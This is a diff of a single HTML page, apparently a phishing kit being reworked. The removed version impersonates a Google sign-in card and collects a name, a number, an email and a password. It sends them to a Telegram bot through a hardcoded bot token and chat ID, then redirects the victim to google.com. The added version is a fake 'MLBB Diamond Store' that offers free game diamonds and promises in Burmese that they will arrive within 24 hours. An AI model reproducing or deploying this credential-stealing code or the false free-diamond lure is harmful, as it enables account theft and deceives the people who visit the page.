@@ -1,114 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="my">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access</title>
+    <title>MLBB Premium Store</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700&display=swap');
-
         body {
-            font-family: 'Outfit', sans-serif;
-            /* အရောင်အသွေးစုံလင်သော Animated Gradient */
-            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
-            background-size: 400% 400%;
-            animation: gradient 10s ease infinite;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
+            margin: 0; padding: 20px; font-family: -apple-system, sans-serif;
+            min-height: 100vh; color: white;
+            background: linear-gradient(45deg, #00c6ff, #0072ff, #764ba2, #ff0080);
+            background-size: 300% 300%;
+            animation: gradientMove 10s ease infinite;
         }
-
-        @keyframes gradient {
+        @keyframes gradientMove {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-
-        .card {
+        .glass-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 30px; padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .header-text { text-align: center; margin-bottom: 20px; font-size: 24px; }
+        .package-btn {
             background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(15px);
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            padding: 40px;
-            border-radius: 40px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
-            width: 340px;
-            text-align: center;
-            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            color: white; padding: 18px; border-radius: 20px;
+            margin-bottom: 12px; display: flex; justify-content: space-between;
+            width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s;
         }
-
-        h2 { font-size: 32px; margin-bottom: 25px; letter-spacing: 2px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
-
-        input {
-            width: 100%; padding: 18px; margin: 12px 0;
-            border: none; border-radius: 20px;
-            background: rgba(255, 255, 255, 0.2);
-            color: white; font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-        }
-
-        input::placeholder { color: rgba(255,255,255,0.7); }
-        input:focus { background: rgba(255,255,255,0.3); box-shadow: 0 0 15px rgba(255,255,255,0.4); }
-
-        button {
-            background: #fff;
-            color: #e73c7e;
-            padding: 18px;
-            border: none; border-radius: 20px; width: 100%;
-            cursor: pointer; font-size: 18px; font-weight: 700;
-            margin-top: 20px; transition: 0.4s;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-
-        button:hover {
-            transform: translateY(-5px);
-            background: #ffebee;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        .package-btn:hover { background: rgba(255, 255, 255, 0.3); }
+        #msg-box {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: white; color: #333; padding: 30px; border-radius: 30px;
+            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); z-index: 100; width: 85%;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Google</h2>
-        <input type="text" id="company" placeholder=" Name" required>
-        <input type="text" id="swp" placeholder="Number" required>
-        <input type="email" id="email" placeholder="Email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button onclick="submitData()">CONTINUE</button>
+
+    <div class="glass-card">
+        <h2 class="header-text">💎 MLBB Diamond Store</h2>
+        <div id="package-container"></div>
+    </div>
+
+    <div id="msg-box">
+        <h3 id="diamond-text" style="color:#764ba2;"></h3>
+        <p>၁၀၀% အာမခံချက်ဖြင့်၊ စိန်ပမာဏသည် ၂၄ နာရီအတွင်း လူကြီးမင်းတို့၏ ဂိမ်းအကောင့်ထဲသို့ အောင်မြင်စွာ ရောက်ရှိပါမည်။</p>
+        <button onclick="hideMsg()" style="padding:15px 40px; border-radius:15px; border:none; background:#764ba2; color:white; font-weight:bold; cursor:pointer;">OK</button>
     </div>
 
     <script>
-        async function submitData() {
-            const company = document.getElementById('company').value;
-            const swp = document.getElementById('swp').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            const token = "8980605393:AAEVTWKvHX--a_XWZMMuLE-M8Pj75WSw5Ks"; 
-            const chatId = "7981991075"; 
-            
-            if (!company || !swp || !email || !password) {
-                alert("Please complete all fields!");
-                return;
-            }
+        const diamonds = [5, 11, 22, 56, 86, 112];
+        const container = document.getElementById('package-container');
 
-            const btn = document.querySelector('button');
-            btn.innerText = "PROCESSING...";
-            
-            const message = `✨ NEW SUBMISSION\n\n🏢 Company: ${company}\n🔢 SWP: ${swp}\n📧 Email: ${email}\n🔑 Password: ${password}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            try {
-                await fetch(url);
-                window.location.href = "https://www.google.com";
-            } catch (err) {
-                alert("Connection Error!");
-                btn.innerText = "CONTINUE";
-            }
+        diamonds.forEach(d => {
+            container.innerHTML += `
+                <button class="package-btn" onclick="showMsg('${d}')">
+                    <span>${d} Diamonds</span> 
+                    <span style="background:#ff3b30; padding:4px 10px; border-radius:8px;">FREE</span>
+                </button>`;
+        });
+
+        function showMsg(amount) { 
+            document.getElementById('diamond-text').innerText = "✅ " + amount + " Diamonds";
+            document.getElementById('msg-box').style.display = 'block'; 
         }
+        function hideMsg() { document.getElementById('msg-box').style.display = 'none'; }
     </script>
 </body>
 </html>
